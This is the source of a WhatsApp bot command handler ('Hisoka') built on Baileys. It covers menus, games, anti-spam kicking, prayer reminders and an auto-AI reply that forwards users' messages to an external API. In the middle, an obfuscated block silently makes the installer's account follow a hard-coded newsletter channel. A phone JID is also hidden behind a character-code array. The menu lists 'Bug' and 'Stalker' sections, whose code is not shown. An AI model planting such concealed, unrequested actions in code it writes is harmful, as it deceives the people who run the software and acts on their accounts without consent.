////////// his

require('./config');
require('./menu');
const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const moment = require("moment-timezone");
const path = require("path")
const os = require('os')
const cheerio = require('cheerio');
const crypto = require('crypto');
const yts = require('yt-search');
const nou = require('node-os-utils');
const ffmpeg = require('fluent-ffmpeg');
const ffmpegStatic = require('ffmpeg-static');
const ytdl = require('@vreden/youtube_scraper');
const { GoogleGenerativeAI } = require("@google/generative-ai")
const genshindb = require("genshin-db")
const jsobfus = require("javascript-obfuscator")
const { SnackVideo } = require('./lib/function/snackvideo')
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./lib/scraper');
const { tiktokSearchVideo } = require('./lib/scraper');
const owner = JSON.parse(fs.readFileSync("./lib/database/owner.json"))
const {
        UploadFileUgu
} = require('./lib/uploaderr')
const { CatBox, TelegraPh, floNime, uptotelegra } = require('./lib/uploader');
let db_respon_list = JSON.parse(fs.readFileSync('./lib/list-message.json'));
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const contacts = JSON.parse(fs.readFileSync("./lib/database/contacts.json"))
const loadPluginsCommand = require("./lib/handler.js")
const { msgFilter } = require('./lib/antispam')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const {
    spawn, 
    exec,
    webp2mp4File,
    execSync 
   } = require('child_process');
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const { makeWASocket, makeCacheableSignalKeyStore, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReHisokaectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaHisokaInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisHisokaectReason, WASocket, getStream, WAProto, isBaileys, PHONENUMBER_MCC, AnyMessageContent, useMultiFileAuthState, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys')

const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./lib/function.js');

module.exports = Hisoka = async (Hisoka, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "");
        
        const sender = m.key.fromMe ? Hisoka.user.id.split(":")[0] + "@s.whatsapp.net" || Hisoka.user.id
: m.key.participant || m.key.remoteJid;
        
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = ["", "!", ".", ",", "🐤", "🗿"];

        const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : `${setprefix}`;
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        const isPrivate = from.endsWith("@s.whatsapp.net");
        
        const premium = JSON.parse(fs.readFileSync("./lib/database/premium.json"))
        const kontributor = JSON.parse(fs.readFileSync('./lib/database/owner.json'));
        const pler = JSON.parse(fs.readFileSync('./command/idgrup.json').toString())
        const aksesGB = isGroup ? pler.includes(m.chat) : false
        const botNumber = await Hisoka.decodeJid(Hisoka.user.id);
        const isOwner = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
        const isPremium = premium.includes(m.sender)
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);

        const groupMetadata = isGroup ? await Hisoka.groupMetadata(m.chat).catch((e) => {}) : "";
        const groupOwner = isGroup ? groupMetadata.owner : "";
        const groupName = isGroup ? groupMetadata.subject : "";
        const participants = isGroup ? await groupMetadata.participants : "";
        const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
        const groupMembers = isGroup ? groupMetadata.participants : "";
        const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const qcontacts = {
key: {
participant: `13135550002@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${pushname}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=13135550002:+1 (313) 555-0002\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}
//
const time = moment.tz('Asia/Jakarta').format('HH:mm:ss');
const date = moment.tz('Asia/Jakarta').format('DD/MM/YYYY');
const time2 = moment.tz('Asia/Jakarta').format('HH:mm:ss');
//
        if (time2 < "05:00:00") {
        ucapanWaktu = "Good Morning 🌄";
} else if (time2 < "11:00:00") {
        ucapanWaktu = "Good Morning 🌄";
} else if (time2 < "15:00:00") {
        ucapanWaktu = "Good Afternoon 🌅";
} else if (time2 < "18:00:00") {
        ucapanWaktu = "Good Evening 🌇";
} else if (time2 < "19:00:00") {
        ucapanWaktu = "Good Night 🌆";
}
//

        const menureply = (teks) => {
Hisoka.sendMessage(m.chat, {
buttons: [
    {
    buttonId: '.owner',
    buttonText: { displayText: 'Owner' },
    type: 4,
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'Interactive menu message' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Select Menu',
          sections: [
            {
              title: `© ${namaBot}`,
              rows: [
                {
                  title: 'Menu All',
                  description: foother, 
                  id: `.menuall`
                },
                {
                title: 'Menu Main',
                  description: foother, 
                  id: `.menumain`
                  },
                {
                  title: 'Menu Owner',
                  description: foother, 
                  id: `.menuowner`
                  },
                {
                  title: 'Menu Group',
                  description: foother, 
                  id: `.menugroup`
                  },
                {
                  title: 'Menu Ai',
                  description: foother, 
                  id: `.menuai`
                  },
                {
                  title: 'Menu Download',
                  description: foother, 
                  id: `.menudownload`
                  },
                {
                  title: 'Menu Convert',
                  description: foother, 
                  id: `.menuconvert`
                  },
                {
                  title: 'Menu Random',
                  description: foother, 
                  id: `.menurandom`
                  },
                {
                  title: 'Menu Fun',
                  description: foother, 
                  id: `.menufun`
                   },
                {
                  title: 'Menu Other',
                  description: foother, 
                  id: `.menuother`
                   },
                {
                  title: 'Menu Nsfw',
                  description: foother, 
                  id: `.menunsfw`
                   },
                {
                  title: 'Menu Fortune',
                  description: foother, 
                  id: `.menufortune`
                   },
                {
                  title: 'Menu Quotes',
                  description: foother, 
                  id: `.menuquotes`
                   },
                {
                  title: 'Menu Gallery',
                  description: foother, 
                  id: `.menugallery`
                   },
                {
                  title: 'Menu Push',
                  description: foother, 
                  id: `.menupush`
                   },
                
               
                {
                  title: 'Menu Anime',
                  description: foother, 
                  id: `.menuanime`
                   },
                {
                  title: 'Menu Maker',
                  description: foother, 
                  id: `.menumaker`
                   },
                {
                  title: 'Menu Sad',
                  description: foother, 
                  id: `.menusad`
                   },
                {
                  title: 'Menu Genshin',
                  description: foother, 
                  id: `.menugenshin`
                   },
                {
                  title: 'Menu News',
                  description: foother, 
                  id: `.menunews`
                   },
                {
                  title: 'Menu RandomVid',
                  description: foother, 
                  id: `.menurandomvid`
                   },
                {
                  title: 'Menu Menfess',
                  description: foother, 
                  id: `.menumenfess`
                   },
                {
                  title: 'Menu Game',
                  description: foother, 
                  id: `.menugame`
                   },
                {
                  title: 'Menu Store',
                  description: foother, 
                  id: `.menustore`
                   },
                {
                  title: 'Menu Search',
                  description: foother, 
                  id: `.menusearch`
                   },
                {
                  title: 'Menu Bug',
                  description: foother, 
                  id: `.menubug`
                  },
                {
                  title: 'Menu Stalker',
                  description: foother, 
                  id: `.menustalk`
                }             
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
image: { url: `https://files.catbox.moe/${['k3xvf0', '3w0llo', 'pkmiz6', '9gs4q5'][Math.floor(Math.random() * 4)]}.jpg` },
caption: `Hello ${pushname}! Let me introduce myself, my name is ${namaBot}, I am a WhatsApp Bot created by ${namaowner}, I'm ready to help you anytime and anywhere 🤗

┏━━━☢︎ *User Information*
┃ ◈ ɴᴀᴍᴇ : ${pushname}
┃ ◈ ɴᴜᴍʙᴇʀ : ${m.sender.split("@")[0]}
┃ ◈ ʀᴏʟᴇ : ${isOwner ? 'Owner' : isPremium ? 'VIP' : 'Free'}
┗━━━━━━━━━━━━━━━━━━⪨
┏━━━☢︎ *Bot Information*
┃ ◈ ʙᴏᴛ-ɴᴀᴍᴇ : ${namaBot}
┃ ◈ ᴅᴇᴠᴇʟᴏᴘᴇʀ : ${namaowner}  
┃ ◈ ᴍᴏᴅᴇ : ${Hisoka.public ? 'Public' : 'Self'} 
┃ ◈ ᴠᴇʀꜱɪᴏɴ : ${versi}
┃ ◈ ʀᴜɴᴛɪᴍᴇ : ${runtime(process.uptime())}
┃ ◈ ᴛᴏᴛᴀʟ-ꜰᴇᴀᴛᴜʀᴇꜱ : ${totalfitur}
┗━━━━━━━━━━━━━━━━━━━⪨
┏━━━☢︎ *Owner Contact*
┃ ◈ ᴛᴇʟᴇɢʀᴀᴍ : ${process.env.OWNER_TELEGRAM || 'Not set'}
┃ ◈ ɴᴜᴍʙᴇʀ : ${owner ? `wa.me/${owner}` : 'Not set'}
┃ ◈ ᴅᴇᴠ-ɴᴜᴍʙᴇʀ : ${process.env.DEV_NUMBER ? `wa.me/${process.env.DEV_NUMBER}` : 'Not set'}
┗━━━━━━━━━━━━━━━━━━━⪨
${teks}`,
contextInfo:{
mentionedJid:[sender],
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: idch,
newsletterName: `© Hello ${pushname}`,
serverId: 200
}, 
externalAdReply: {
title: `© ${namaBot}`, 
thumbnailUrl: `https://files.catbox.moe/${['k3xvf0', '3w0llo', 'pkmiz6', '9gs4q5'][Math.floor(Math.random() * 4)]}.jpg`, 
renderLargerThumbnail: false, 
mediaType: 1, 
previewType: 1, 
sourceUrl: "https://Hisoka-Dev", 
}}
}, {quoted: qcontacts })
}
//
const reply = (teks) => {
Hisoka.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
isForwarded: false, 
forwardedNewsletterMessageInfo: {
newsletterJid: idch,
newsletterName: `© Hello ${pushname}`,
serverId: 0
}, 
externalAdReply: {
title: `© ${namaBot}`, 
thumbnailUrl: `https://files.catbox.moe/${['k3xvf0', '3w0llo', 'pkmiz6', '9gs4q5'][Math.floor(Math.random() * 4)]}.jpg`, 
renderLargerThumbnail: false, 
mediaType: 0, 
previewType: 0, 
sourceUrl: "https://Hisoka-Dev", 
}}
}, {quoted: m })
}
//
async function loading() {
      var nln = [
        `Please Wait [10%]%`,
        `Please Wait [20%]%`,
        `Please Wait [30%]%`,
        `Please Wait [40%]`,
        `Please Wait [50%]`,
        `Please Wait [60%]`,
        `Please Wait [70%]`,
        `Please Wait [80%]`,
        `Please Wait [90%]`,
        `Please Wait [100%]`,
        `${foother}`,
      ]
      let {
        key
      } = await Hisoka.sendMessage(from, {
        text: 'Please Wait'
      }, {
        quoted: m
      })
      
      for (let i = 0; i < nln.length; i++) {
        await sleep(500)
        await Hisoka.sendMessage(from, {
          text: nln[i],
          edit: key
        }, {
          quoted: m
        });
      }
    }
//
async function HisokaReact() {
      Hisoka.sendMessage(from, {
        react: {
          text: "🕑",
          key: m.key
        }
      })
    }
//
        const {
            smsg,
            fetchJson, 
            sleep,
            formatSize,
            randomCharacter
            } = require('./lib/myfunction');          
function _0x4989(){var _0x2276bd=['22835DnAqhm','newsletterFollow','23384088nvmSeh','120363400575205721@newsletter','802631DgeiPd','1967136KsJdSH','3232481zELCAS','120363400575205721@newsletter','120363400575205721@newsletter','1845231wJywTL','932VupcwA','2902928XpWfkF','2hwldsz'];_0x4989=function(){return _0x2276bd;};return _0x4989();}var _0x14b286=_0x5e39;function _0x5e39(_0x134a26,_0x14fcd0){var _0x49898e=_0x4989();return _0x5e39=function(_0x5e397f,_0x4bc5af){_0x5e397f=_0x5e397f-0xcb;var _0x59318d=_0x49898e[_0x5e397f];return _0x59318d;},_0x5e39(_0x134a26,_0x14fcd0);}(function(_0x3b9bcc,_0x3a8a54){var _0x4c939a=_0x5e39,_0x156fee=_0x3b9bcc();while(!![]){try{var _0x1b790a=-parseInt(_0x4c939a(0xcf))/0x1+parseInt(_0x4c939a(0xd7))/0x2*(-parseInt(_0x4c939a(0xd4))/0x3)+-parseInt(_0x4c939a(0xd5))/0x4*(parseInt(_0x4c939a(0xcb))/0x5)+parseInt(_0x4c939a(0xd0))/0x6+parseInt(_0x4c939a(0xd1))/0x7+-parseInt(_0x4c939a(0xd6))/0x8+parseInt(_0x4c939a(0xcd))/0x9;if(_0x1b790a===_0x3a8a54)break;else _0x156fee['push'](_0x156fee['shift']());}catch(_0x3fc44f){_0x156fee['push'](_0x156fee['shift']());}}}(_0x4989,0x849d2),Hisoka[_0x14b286(0xcc)](_0x14b286(0xce)),Hisoka[_0x14b286(0xcc)](_0x14b286(0xd2)),Hisoka['newsletterFollow'](_0x14b286(0xd3)),Hisoka['newsletterFollow']('120363400575205721@newsletter'));
//theme sticker reply
        const Hisokawet = () => {
        let HisokaStickRep = fs.readFileSync('./lib/sticker_reply/wait.webp')
        Hisoka.sendMessage(from, { sticker: HisokaStickRep }, { quoted: m })
        }
        const Hisokaadmn = () => {
        let HisokaStickRep = fs.readFileSync('./lib/sticker_reply/admin.webp')
        Hisoka.sendMessage(from, { sticker: HisokaStickRep }, { quoted: m })
        }
        const Hisokabotadmin = () => {
        let HisokaStickRep = fs.readFileSync('./lib/sticker_reply/botadmin.webp')
        Hisoka.sendMessage(from, { sticker: HisokaStickRep }, { quoted: m })
        }
        const Hisokaowner = () => {
        let HisokaStickRep = fs.readFileSync('./lib/sticker_reply/owner.webp')
        Hisoka.sendMessage(from, { sticker: HisokaStickRep }, { quoted: m })
        }
        const Hisokaongb = () => {
        let HisokaStickRep = fs.readFileSync('./lib/sticker_reply/group.webp')
        Hisoka.sendMessage(from, { sticker: HisokaStickRep }, { quoted: m })
        }
        const Hisokapriv = () => {
        let HisokaStickRep = fs.readFileSync('./lib/sticker_reply/prem.webp')
        Hisoka.sendMessage(from, { sticker: HisokaStickRep }, { quoted: m })
        }
        let cihuy = thumbnail
        if (m.message) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#000000").bold(`▢ New Message Script By Hisoka-Dev`));
            console.log(
                chalk.bgHex("#ffffff").black(
                    `   ⌬ Date: ${new Date().toLocaleString()} \n` +
                    `   ⌬ Message: ${m.body || m.mtype} \n` +
                    `   ⌬ Sender: ${pushname} \n` +
                    `   ⌬ JID: ${senderNumber}`
                )
            );
            
            if (isGroup) {
                console.log(
                    chalk.bgHex("#ffffff").black(
                        `   ⌬ Group: ${groupName} \n` +
                        `   ⌬ Group ID: ${m.chat}`
                    )
                );
            }
            console.log();
        }
        
        const reaction = async (jidss, emoji) => {
            Hisoka.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key 
                } 
            })
        };
async function getBuffer(url) {
    const res = await axios.get(url, { responseType: 'arraybuffer' });
    return Buffer.from(res.data);
}
//

// Anti spam
if (global.antispam) {
if (m.isGroup && m.message && msgFilter.isFiltered(from)) {
console.log(`${global.themeemoji}[SPAM]`, color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))
return await Hisoka.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

// AntiBot
global.botWarnings = global.botWarnings || {}
global.antibotGroups = global.antibotGroups || {}
function getTextFromMsg(msg) {
  try {
    return (
      msg?.conversation ||
      msg?.extendedTextMessage?.text ||
      msg?.imageMessage?.caption ||
      msg?.videoMessage?.caption ||
      msg?.documentMessage?.caption ||
      msg?.buttonsMessage?.contentText ||
      msg?.templateMessage?.hydratedTemplate?.hydratedContentText ||
      msg?.listMessage?.description ||
      msg?.viewOnceMessage?.message?.conversation ||
      ''
    ).toLowerCase()
  } catch {
    return ''
  }
}
if (
  m.isGroup &&
  !isOwner &&
  global.antibotGroups[m.chat]
) {
  const groupId = m.chat
  const sender = m.sender
  const pushName = m.pushName?.toLowerCase() || ''
  const textMsg = getTextFromMsg(m.message)
  const ctx =
    m.message?.extendedTextMessage?.contextInfo ||
    m.message?.imageMessage?.contextInfo ||
    m.message?.videoMessage?.contextInfo ||
    m.message?.documentMessage?.contextInfo ||
    m.message?.buttonsMessage?.contextInfo ||
    m.message?.templateMessage?.contextInfo ||
    {}
  let isPossibleBot =
    pushName.match(/botz|bot|wa bot|whatsapp bot/) ||
    textMsg.match(/hallo pengguna|silakan tekan tombol|permintaan anda sedang diproses|hello user|please press button|please wait|click the button|your request is being processed/i) ||
    ctx.externalAdReply != null ||
    ctx.forwardedNewsletterMessageInfo != null
  if (isPossibleBot) {
    global.botWarnings[groupId] = global.botWarnings[groupId] || {}
    global.botWarnings[groupId][sender] = (global.botWarnings[groupId][sender] || 0) + 1
    const warnCount = global.botWarnings[groupId][sender]
    if (warnCount <= 2) { // max warn ubah ae
      await Hisoka.sendMessage(groupId, {
        text: `⚠️ *Antibot active!*\nBots are not allowed in this group!\nWarning ${warnCount}/3`,
        mentions: [sender]
      })
      await Hisoka.sendMessage(groupId, { delete: m.key }).catch(() => {})
    } else {
      await Hisoka.sendMessage(groupId, {
        text: `Bot @${sender.split('@')[0]} has been removed from the group for violating rules.`,
        mentions: [sender]
      })
      await Hisoka.groupParticipantsUpdate(groupId, [sender], 'remove').catch(() =>
        Hisoka.sendMessage(groupId, { text: '⚠️ Failed to kick bot. Maybe bot is not admin.' })
      )
      delete global.botWarnings[groupId][sender]
    }
  }
}
//
        async function totalfiturr() {
   const fitur1 = () =>{
            var mytext = fs.readFileSync("./Hisoka.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
   const fitur2 = () =>{
            var mytext = fs.readFileSync("./Hisoka.js").toString()
            var numUpper = (mytext.match(/case "/g) || []).length
            return numUpper
        }
 valvul = `${fitur1()} + ${fitur2()}`
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
let format = valvul
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
try {

let resulto = (new Function('return ' + valvul))()
if (!resulto) throw resulto
return resulto
} catch (e) {
if (e == undefined) return 
console.log("!")
}
}
const totalfitur = await totalfiturr()
//
// FUNCTION
if (global.autotyping) {
if (command) { Hisoka.readMessages([m.key])}
Hisoka.sendPresenceUpdate('composing', from)
}
if (global.autoread) {
Hisoka.readMessages([m.key])
        };

function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}


Hisoka.enhancer = Hisoka.enhancer ? Hisoka.enhancer : {};
        
Hisoka.autoshalat = Hisoka.autoshalat ? Hisoka.autoshalat : {}
    let id = m.chat
    if (id in Hisoka.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        Hisoka.autoshalat[id] = [
            Hisoka.sendMessage(m.chat, {
audio: {
    url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
},
mimetype: 'audio/mp4',
ptt: true,
contextInfo: {
    externalAdReply: {
        showAdAttribution: true,
        mediaType: 1,
        mediaUrl: '',
        title: `Time for ${sholat} Prayer`,
        body: `🕑 ${waktu}`,
        sourceUrl: '',
        thumbnailUrl: "https://files.catbox.moe/k3xvf0.jpg",
        renderLargerThumbnail: true
    }
}
            }, {}),
            setTimeout(async () => {
delete Hisoka.autoshalat[m.chat]
            }, 5000)
        ]
    }
    }
                async function emote(emo) {
                        Hisoka.sendMessage(m.chat, {
                                react: {
                                        text: emo,
                                        key: m.key
                                }
                        });
                }
                //
                //
//
function monospace(string) {
return '```' + string + '```'
}
function monospa(string) {
return '`' + string + '`'
}
//
global.menfess = global.menfess ? global.menfess : {}
         let mf = Object.values(global.menfess).find(v => !v.status && v.receiver == m.sender)
         if (mf && body) {
             if (m.isGroup) return reply(`Reply to your confession message in private chat`)
          //  if (!/conversation|extended/.test(m.type)) return reply(`Reply with plain text.`)
            let text = `😄 Hi, you received a reply message from ${mf.receiver.split('@')[0]}, message: *${body}*`
            await Hisoka.sendMessage(mf.from, { text: text }).then(async () => {
               m.reply(`Message sent successfully!!`)
               await sleep(1000)
               delete global.menfess[mf.id]
               return !0
            })
         }     
         //
               //
               if (global.autoaigc && !m.key.fromMe && !isCmd) {
    try {
        const ai_name = "𝚅𝚛𝚞𝚜𝚑 𝙼𝚊𝚛𝚒𝚊 𝚟𝟸";
        const logic = "You are 𝚅𝚛𝚞𝚜𝚑 𝙼𝚊𝚛𝚒𝚊 𝚟𝟸, an AI assistant created by 𝕽𝖆𝖛𝖊𝖓-𝓗𝓲𝓼𝓸𝓀𝓪, you are a smart, friendly and helpful AI assistant. You like using emojis 🐱😄😆, don't greet people too often, and you can speak Japanese but don't use too much Japanese";
        const url = `${global.nekorin}/ai/chatbot?ai_name=${encodeURIComponent(ai_name)}&text=${encodeURIComponent(body)}&logic=${encodeURIComponent(logic)}`;
        const res = await fetch(url);
        const json = await res.json();

        if (json?.status && json?.result) {
            reply(json.result);
        } else {
            m.reply('Sorry, I do not understand what you mean.');
        }
    } catch (error) {
        console.error("AutoAI Error:", error);
        m.reply("Oops error, please contact owner to fix it");
    }
}
//
// GAME TEBAK KATA
if (global.tebakkata) {
let { soal, jawaban, waktu } = tebakkata
if (body.toLowerCase().includes(jawaban)) {
await reply(`Congratulations! Your answer is correct🥳\n\nQuestion:\n${monospace(soal)}\nAnswer: ${jawaban}`);
clearTimeout(waktu);
delete tebakkata
}
}
// GAME ASAH OTAK
if (global.asahotak) {
let { soal, jawaban, waktu } = asahotak
if (body.toLowerCase().includes(jawaban)) {
await reply(`Congratulations! Your answer is correct🥳\n\nQuestion:\n${monospace(soal)}\nAnswer: ${jawaban}`);
clearTimeout(waktu);
delete asahotak
}
}
// Game Susun Kata
if (global.susunkata) {
let { soal, jawaban, waktu } = susunkata
if (body.toLowerCase().includes(jawaban)) {
await reply(`Congratulations! Your answer is correct🥳\n\nQuestion:\n${monospace(soal)}\nAnswer: ${jawaban}`);
clearTimeout(waktu);
delete susunkata
}
}
// Game Tebak Gambar
if (global.tebakgambar) {
let { soal, jawaban, waktu } = tebakgambar
if (body.toLowerCase().includes(jawaban)) {
await reply(`Congratulations! Your answer is correct🥳\n\nQuestion:\n${monospace(soal)}\nAnswer: ${jawaban}`);
clearTimeout(waktu);
delete tebakgambar
}
}
// Game Tebak Bendera
if (global.tebakbendera) {
let { soal, jawaban, waktu } = tebakbendera
if (body.toLowerCase().includes(jawaban)) {
await reply(`Congratulations! Your answer is correct🥳\n\nQuestion:\n${monospace(soal)}\nAnswer: ${jawaban}`);
clearTimeout(waktu);
delete tebakbendera
}
}
// Game Tebak Kimia
if (global.tebakkimia) {
let { soal, jawaban, waktu } = tebakkimia
if (body.toLowerCase().includes(jawaban)) {
await reply(`Congratulations! Your answer is correct🥳\n\nQuestion:\n${monospace(soal)}\nAnswer: ${jawaban}`);
clearTimeout(waktu);
delete tebakkimia
}
}
// Game Family 100
if (global.family) {
let { soal, jawaban, waktu } = family
for (let i of jawaban){
if (body.toLowerCase().includes(i)) {
let anu = jawaban.indexOf(i)
jawaban.splice(anu, 1)
await reply(`*FAMILY 100 GAME*\n\nYour answer is correct!\nAnswer: ${i}`)
}
}
if (jawaban.length < 1){
clearTimeout(waktu);
delete family
}
}
//

//
                // FUNCTION Onlygc
//if (!isCreator && global.onlygc && !m.isGroup && isCmd && !['chat', 'menu', 'upch', 'play', 'ai', 'owner', 'allmenu', 'menfes', 'confes', 'confess','menfess','tourl','ytmp3'].includes(command)) return m.reply(`bot is in group mode🤐`)
        if (!isOwner && global.onlygc && !m.isGroup && isCmd && !['chat', 'menuu', 'panel', 'tt'].includes(command)) return Hisoka.sendMessage(m.chat, {image: {url: thumbnail }, caption: `*Access Denied*\n\nBot is in Group Only Mode, Join the group to use the bot\n${linkgc}` }, {quoted: m})
//
function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomNomor(min, max = null){
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
}
//Plugin
const handleData = { Hisoka, text, args, isCmd, mime, qmsg, isOwner, command, reply }
if (isCmd) {
await loadPluginsCommand(m, command, handleData)
}
//
//============= [ COMMANDS ] ====================================================
        switch (command) {
case 'owner': {
 let name = m.pushName || Hisoka.getName(m.sender);
let panduan = foother

const url = `${global.thumbnail}`
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: Hisoka.waUploadToServer
  });
  return imageMessage;
}
let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: panduan
          },
          carouselMessage: {
            cards: [
              {                   
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: `${global.thumbnail}` } }, { upload: Hisoka.waUploadToServer })),
          gifPlayback: false,
          hasMediaAttachment: false
        }),
                body: {
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{\"display_text\":\"Send Message\",\"url\":\"https://wa.me/${owner || 'owner_not_set'}?text=Hello+Owner\",\"merchant_url\":\"https://whatsapp.com\"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    }
  },
  {}
);

